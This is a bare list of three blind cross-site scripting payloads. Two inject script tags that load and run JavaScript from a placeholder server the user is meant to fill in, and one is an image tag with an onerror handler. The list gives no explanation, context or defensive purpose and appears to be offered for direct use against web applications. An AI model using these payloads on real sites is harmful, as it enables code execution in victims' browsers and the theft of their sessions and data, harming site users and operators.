//Blind XSS payload

"><script src=https://your_server_address></script>

<script>$.getScript("//your_server_address")</script>

<img src=https://your_server_address onerror=alert(0);>

